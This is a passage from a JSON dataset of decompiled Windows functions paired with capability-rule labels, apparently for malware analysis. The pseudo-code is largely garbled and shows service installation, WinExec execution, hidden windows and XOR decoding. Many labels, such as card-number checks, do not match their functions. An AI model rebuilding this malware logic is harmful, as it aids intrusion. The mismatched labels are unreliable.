0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407388;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404970(auStack1564, 0x4072e4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "004026d0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040272c) overlaps instruction at (ram,0x0040272b)\n// \n\nuint32_t __cdecl fcn.004026d0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    int32_t unaff_EBX;\n    uint16_t *unaff_EDI;\n    ushort in_SS;\n    bool bVar6;\n    \n    bVar6 = (POPCOUNT(unaff_EDI - 1U & 0xff) & 1U) == 0;\n    if ((!bVar6) && (bVar6)) {\n        puVar3 = segment(in_SS, *0x10 + -0x10);\n        uVar5 = *puVar3;\n        if (unaff_EBX >> 8 < in_EDX >> 8) {\n            *(arg_8h - 0x75) = *(arg_8h - 0x75) << 7;\n            arg_10h = unaff_EBX;\n            arg_ch = unaff_EDI;\n            goto code_r0x00402730;\n        }\n        if (bVar6) {\n            puVar1 = in_ECX + -0x18;\n            uVar4 = *puVar1;\n            *puVar1 = *puVar1 + 0xa5;\n            uVar5 = uVar5 + 1 & 0xffffff00;\n            uVar4 = -(0x5a < uVar4) & *(uVar5 | -(0x5a < uVar4));\n            pcVar2 = unaff_EBX + -0x3f7adb3c;\n            *pcVar2 = *pcVar2 + uVar4;\n            if (*pcVar2 != '\\0') {\n                (*_sym.imp.KERNEL32.dll_WinExec)();\n                return 1;\n            }\n            return uVar5 | uVar4;\n        }\n    }\n    if (arg_10h != 0) {\n        do {\n            uVar5 = *arg_ch;\ncode_r0x00402730:\n            arg_8h = arg_8h + uVar5;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 634
    },
    "00404e00": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404f7e) overlaps instruction at (ram,0x00404f7a)\n// \n// WARNING: Removing unreachable block (ram,0x00404e88)\n// WARNING: Removing unreachable block (ram,0x00404ea5)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404e00(uchar *arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t *in_EAX;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    char cVar8;\n    int32_t *in_ECX;\n    int32_t iVar7;\n    int32_t *in_EDX;\n    char cVar9;\n    uint unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    unkbyte10 in_ST0;\n    uchar uStack156;\n    uint uStack155;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack40;\n    int32_t *piStack28;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    cVar8 = in_ECX >> 8;\n    cVar9 = unaff_EBX;\n    bVar11 = SBORROW4(in_ECX & 0xffff0000 | CONCAT11(cVar8 - cVar9, in_ECX), in_EDX);\n    *arg_8h = 0xb7;\n    if ((!bVar11) && (bVar11)) {\n        LOCK();\n        arg_8h = 0x138b2633;\n        in_EAX = in_EAX + 0x658f517f;\n    }\n    arg_8h[1] = 0xfa;\n    arg_8h[2] = 0x4f;\n    arg_8h[3] = 0xdf;\n    arg_8h[4] = 0xb2;\n    arg_8h[5] = 0x24;\n    arg_8h[6] = 0xc0;\n    bVar11 = (POPCOUNT(in_EDX & 0x66) & 1U) == 0;\n    arg_8h[7] = 3;\n    if ((bVar11) || (!bVar11)) {\n        arg_8h[8] = 0x26;\n        piVar5 = in_EAX;\n    }\n    else {\n        puStack52 = *0xc617b43a;\n        arg_8h = 0x34a96cf5;\n        *0x34a96cf5 = *0x34a96cf5 | in_EDX + 1 >> 8;\n        piVar5 = in_EDX + 1;\n        in_EDX = in_EAX;\n    }\n    arg_8h[9] = 0x6c;\n    arg_8h[10] = 0x3a;\n    bVar11 = piVar5 != unaff_EBX;\n    arg_8h[0xb] = 0xdc;\n    if ((bVar11) && (!bVar11)) {\n        piVar5 = piVar5 & 0xe2f4cc58;\n    }\n    arg_8h[0xc] = 7;\n    uVar4 = CONCAT11(((piVar5 >> 8) - cVar9) + 'M', piVar5) & 0x26ae;\n    arg_8h[0xd] = 0xc6;\n    if ((uVar4 == 0) || (uVar4 != 0)) {\n        arg_8h[0xe] = 0x75;\n        puVar2 = puStack52;\n        piStack28 = in_EDX;\n    }\n    else {\n        puVar2 = &stack0xfffffffc;\n        piStack28 = in_ECX;\n        if (piVar5 != 0xffffffff) {\n            uStack56 = 0;\n            uStack156 = 0;\n            puVar10 = &uStack155;\n            for (iVar7 = 0x18; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            *puVar10 = 0;\n            *(puVar10 + 2) = 0;\n            fcn.00404e00(&uStack156, &uStack56);\n            fcn.00401430(&uStack156, uStack56, 0x4114c4, 0x10000);\n            *unaff_ESI = 0x4114c4;\n            *puStack40 = 0x10000;\n            return;\n        }\n    }\n    puStack40 = puVar2;\n    piVar5 = in_ECX & 0xffff0000 | CONCAT11(cVar8 - cVar9, in_ECX);\n    uVar6 = *(puStack40 + 8);\n    *(uVar6 + 0xf) = 0x91;\n    if ((piVar5 < in_EDX) || (in_EDX <= piVar5)) {\n        *(uVar6 + 0x10) = 0xee;\n    }\n    else {\n        *(uVar6 + 0x8316dbec) = in_ST0;\n        uVar3 = uVar6 - 1;\n        uVar1 = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + uVar1 * '\\x06';\n        uVar6 = uVar6 - 1 & 0xffffff00 |\n                uVar3 + (0x90 < (uVar3 & 0xf0) | piVar5 < in_EDX | uVar1 * (0xf9 < uVar3)) * '`';\n        *piStack28 = *piStack28 + 0x40c6df84;\n        piStack28 = piStack28 & 0xff;\n    }\n    bVar11 = (piStack28 ^ unaff_EBX >> 8 | 0x67) != 0;\n    *(uVar6 + 0x11) = 0x37;\n    if ((bVar11) && (!bVar11)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    **(puStack40 + 0xc) = 0x12;\n    return;\n}\n",
        "token_count": 1481
    },
    "00401080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401080(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4214d8 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4214d8 = 1;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00401100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004011b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040120f) overlaps instruction at (ram,0x0040120d)\n// \n\nbool fcn.004011b0(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    char *pcVar5;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar6;\n    uint8_t in_AF;\n    ulong uVar7;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    char cVar4;\n    \n    var_4h = 0x104;\n    uVar7 = fcn.00401100(0x80000002, 0x4072f4, 0x407334, &var_8h, &var_10ch);\n    pcVar5 = uVar7 >> 0x20;\n    uVar2 = uVar7;\n    bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return false;\n    }\n    if (bVar6) {\n        if (!bVar6) {\n            out(*unaff_ESI, uVar7 >> 0x20);\n            do {\n                cVar4 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar4 - in_AF), -in_AF);\n            } while (in_AF || cVar4 == *pcVar5);\n            piVar1 = unaff_EDI + pcVar5 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x73) = uVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    iVar3 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar3 != -1;\n}\n",
        "token_count": 503
    },
    "004012f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.004012f0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    int32_t unaff_EBX;\n    int32_t iVar3;\n    uint *unaff_EDI;\n    bool bVar4;\n    uint8_t in_AF;\n    bool bVar5;\n    bool in_OF;\n    uint64_t uVar6;\n    uint in_stack_00000010;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_EDI = in_stack_00000010;\n        return CONCAT44(lpServiceName, in_stack_00000010);\n    }\n    uVar6 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    iVar3 = uVar6;\n    if (iVar3 == 0) {\n        return uVar6 & 0xffffffff00000000;\n    }\n    bVar4 = false;\n    bVar5 = (CONCAT11(((uVar6 >> 8) - unaff_EBX) + 'M', uVar6) & 0x26ae) == 1;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar3);\n    if ((!bVar5) && (bVar5)) {\n        if (bVar4 || unaff_EBX + 1 == 0) {\n            uVar6 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                              (extraout_ECX, lpServiceName, lpServiceName, 0xf01ff, 1, 0, 1, uVar2, 0, 0);\n            if (uVar6 == 0) {\n                return uVar6 & 0xffffffff00000000;\n            }\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar6);\n            return CONCAT44(extraout_EDX_00, 1);\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        iVar3 = iVar3 + 1;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n    return CONCAT44(extraout_EDX, uVar2);\n}\n",
        "token_count": 596
    },
    "00401380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401380(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00401430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401453) overlaps instruction at (ram,0x00401450)\n// \n\nvoid __cdecl fcn.00401430(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            arg_10h = arg_10h ^ *(arg_10h + 0xe58be73);\n            *(uVar1 + arg_10h) = *(uVar1 % arg_ch + arg_8h) ^ 0x72;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "004014a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004014a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x421500, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00401680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401680(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402310(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "004019a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004019a0(char *arg_8h, uint32_t arg_ch, char *arg_10h, char *arg_14h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    bVar6 = CARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar2 = (arg_8h - arg_14h) + arg_ch;\n    pcVar1 = arg_8h;\n    if ((!bVar6 && pcVar2 != NULL) && (bVar6 || pcVar2 == NULL)) {\n        pcVar1 = arg_8h & 0xe2f4cc58;\n    }\n    pcVar3 = arg_14h;\n    if (arg_14h != NULL) {\n        if (arg_8h <= pcVar2) {\n            do {\n                pcVar3 = arg_10h;\n                if (*arg_8h == *arg_10h) {\n                    bVar6 = true;\n                    pcVar1 = arg_14h;\n                    pcVar4 = arg_8h;\n                    pcVar5 = arg_10h;\n                    do {\n                        pcVar5 = pcVar5 + 1;\n                        pcVar4 = pcVar4 + 1;\n                        pcVar1 = pcVar1 + -1;\n                        if (pcVar1 == NULL) break;\n                        bVar6 = *pcVar4 == *pcVar5;\n                    } while (bVar6);\n                    pcVar1 = arg_8h;\n                    if (bVar6) goto code_r0x00401a16;\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar2);\n        }\n        pcVar1 = NULL;\n    }\ncode_r0x00401a16:\n    return CONCAT44(pcVar3, pcVar1);\n}\n",
        "token_count": 455
    },
    "00401a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401a80(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint8_t uVar2;\n    uint32_t in_EDX;\n    int32_t unaff_EBX;\n    uchar **unaff_EBP;\n    uint32_t uVar3;\n    uint8_t in_CF;\n    bool bVar4;\n    uint8_t in_AF;\n    uchar in_ZF;\n    ulong uVar5;\n    uchar *puStack4;\n    \n    while ((puStack4 = unaff_EBP,  !in_ZF && (in_ZF))) {\n        unaff_EBX = unaff_EBX + 1;\n        if (!in_CF && unaff_EBX != 0) {\n            uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n            in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f;\n            *(in_EAX + 0x2a) = *(in_EAX + 0x2a) - unaff_EBX;\n            break;\n        }\n        uVar5 = fcn.004013f0(0x407014);\n        in_EDX = uVar5 >> 0x20;\n        uVar3 = uVar5;\n        in_ZF = uVar3 == 0xffffffff;\n        if (in_ZF) {\n            return 0;\n        }\n        if ((uVar3 < 0) || (uVar3 < 0x80000000)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n            return 1;\n        }\n        in_CF = 9 < (uVar5 & 0xf) | in_AF;\n        in_EAX = uVar3 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_CF, uVar5 + in_CF * '\\x06') & 0xff0f;\n        unaff_EBP = &puStack4;\n        in_AF = in_CF;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    uVar3 = 0;\n    bVar4 = false;\n    if (arg_ch != 0) {\n        do {\n            if ((!bVar4) && (bVar4)) {\n                arg_8h = arg_8h + *(arg_8h + 0x69 + in_EDX * 4) + bVar4;\n            }\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)(unaff_EBX);\n            in_EAX = iVar1 / 0x1a;\n            uVar2 = iVar1 % 0x1a + 0x61;\n            in_EDX = iVar1 % 0x1a & 0xffffff00U | uVar2;\n            *(uVar3 + arg_8h) = uVar2;\n            uVar3 = uVar3 + 1;\n            bVar4 = uVar3 < arg_ch;\n        } while (bVar4);\n    }\n    return in_EAX;\n}\n",
        "token_count": 740
    },
    "00401b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401b20(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    uint8_t uVar3;\n    uint32_t unaff_EBX;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint8_t in_AF;\n    bool bVar5;\n    char cVar6;\n    char cVar7;\n    ulong uVar8;\n    \n    cVar7 = '\\0';\n    cVar6 = '\\0';\n    bVar5 = (unaff_EBX & 0x4d) == 0;\n    uVar8 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar2 = uVar8;\n    if ((!bVar5 && cVar7 == cVar6) && (bVar5 || cVar7 != cVar6)) {\n        in_AF = 9 < (uVar8 & 0xf) | in_AF;\n        uVar2 = uVar2 & 0xffff0000 | CONCAT11((uVar8 >> 8) + in_AF, uVar8 + in_AF * '\\x06') & 0xff0f;\n        if (extraout_ECX == 0) {\n            while( true ) {\n                uVar3 = (uVar8 >> 0x20) + 0x61;\n                *(uVar8 + unaff_EBX) = uVar3;\n                uVar4 = uVar8 + 1;\n                bVar5 = uVar4 < unaff_EDI;\n                if (!bVar5) break;\n                if ((!bVar5) && (bVar5)) {\n                    unaff_EBX = unaff_EBX + *(unaff_EBX + 0x69 + (uVar3 | uVar8 >> 0x20 & 0xffffff00) * 4) + bVar5;\n                }\n                iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n                uVar2 = iVar1 / 0x1a;\n                uVar8 = CONCAT44(iVar1 % 0x1a, uVar4);\n            }\n            return uVar2;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar4 = fcn.00402270(uVar2, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n    return uVar4;\n}\n",
        "token_count": 566
    },
    "00401e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401ee8) overlaps instruction at (ram,0x00401ee7)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401e30(uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t uVar8;\n    uint in_EDX;\n    uchar *puVar9;\n    uint *puVar10;\n    uchar *unaff_EDI;\n    uint *puVar11;\n    ushort in_CS;\n    uchar uVar12;\n    bool bVar13;\n    bool bVar14;\n    bool bVar15;\n    ulong uVar16;\n    unkbyte6 Var17;\n    uchar *in_stack_00000010;\n    uint8_t *in_stack_00000014;\n    uint var_4h;\n    \n    uVar8 = in_EDX >> 8;\n    uVar12 = uVar8 < 0x36;\n    bVar14 = SBORROW1(uVar8, '6');\n    bVar13 = uVar8 == 0x36;\n    Var17 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    if ((!bVar14) && (bVar14)) {\n        uVar1 = in(Var17 >> 0x20);\n        *unaff_EDI = uVar1;\n        puVar10 = &stack0xfffffffc;\n        if (!uVar12 && !bVar13) {\n            while( true ) {\n                puVar9 = puVar10;\n                uVar16 = (*(unaff_EDI + 0x59))(in_CS);\n                if ((uVar12) || (!uVar12)) break;\n                in_stack_00000014 = 0xb7f8c08b;\n                if (&stack0x00000018 < *uVar16 || uVar16 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                uVar12 = 0;\n                puVar10 = &stack0x00000010;\n                in_stack_00000010 = puVar9;\n            }\n            in_stack_00000014 = uVar16 >> 0x20;\n            in_stack_00000014 = 0x7;\n            in_stack_00000010 = 0x407058;\n            iVar5 = fcn.004019a0(*(puVar9 + 0x18), *(puVar9 + 0x1c), 0x407058, 7);\n            *(puVar9 + -4) = iVar5;\n            if (iVar5 == 0) {\n                return 0;\n            }\n            if ((iVar5 < 0) || (iVar5 >= 0)) {\n                in_stack_00000010 = 0x7;\n            }\n            else {\n                pcVar2 = iVar5 + 0x7b92f;\n                *pcVar2 = *pcVar2 + pcVar2;\n                in_stack_00000010 = extraout_ECX;\n            }\n            pcVar3 = _sym.imp.MSVCRT.dll_rand;\n            puVar9[-0x24] = 0;\n            puVar10 = puVar9 + -0x23;\n            for (; in_stack_00000010 != NULL; in_stack_00000010 = in_stack_00000010 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            *puVar10 = 0;\n            *(puVar10 + 2) = 0;\n            puVar10 = NULL;\n            do {\n                in_stack_00000014 = 0x401f97;\n                uVar6 = (*pcVar3)();\n                puVar7 = uVar6 & 0x800000ff;\n                if (puVar7 < 0) {\n                    puVar7 = (puVar7 + -1 | 0xffffff00) + 1;\n                }\n                (puVar9 + -0x24)[puVar10] = puVar7;\n                puVar10 = puVar10 + 1;\n                in_stack_00000010 = extraout_ECX_00;\n            } while (puVar10 < 0x20);\n            while( true ) {\n                in_stack_00000014 = puVar7;\n                bVar13 = false;\n                bVar15 = false;\n                bVar14 = (puVar10 & (puVar7 & 0xffff0000 | CONCAT11((puVar7 >> 8) + '\\x01', puVar7))) == 0;\n                puVar10 = puVar9 + -0x24;\n                puVar11 = *(puVar9 + -4);\n                for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar11 = *puVar10;\n                    puVar10 = puVar10 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                in_stack_00000014 = *(puVar9 + -4);\n                in_stack_00000010 = 0x20;\n                puVar7 = fcn.00401bc0(*(puVar9 + 8), *(puVar9 + 0xc), *(puVar9 + 0x10), *(puVar9 + 0x14), puVar9 + -0x24\n                                      , 0x20, in_stack_00000014);\n                if ((bVar13 || bVar14) || (!bVar13 && !bVar14)) break;\n                if (!bVar15) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                *puVar7 = *puVar7 | puVar7;\n                *puVar7 = *puVar7 + puVar7;\n            }\n            fcn.00402780();\n            return 1;\n        }\n    }\n    fcn.004012f0(0x51084d8b, 0x56);\n    uVar4 = fcn.00401380(Var17, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(Var17);\n    return uVar4;\n}\n",
        "token_count": 1444
    },
    "004021d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402232) overlaps instruction at (ram,0x0040222d)\n// \n// WARNING: Removing unreachable block (ram,0x0040221b)\n// WARNING: Removing unreachable block (ram,0x00402232)\n// WARNING: Removing unreachable block (ram,0x0040221d)\n// WARNING: Removing unreachable block (ram,0x00402225)\n// WARNING: Removing unreachable block (ram,0x00402235)\n// WARNING: Removing unreachable block (ram,0x0040223c)\n// WARNING: Removing unreachable block (ram,0x0040223e)\n\nuchar fcn.004021d0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00404d20(*0x10 + -8);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 207
    },
    "00402270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402270(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00402780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
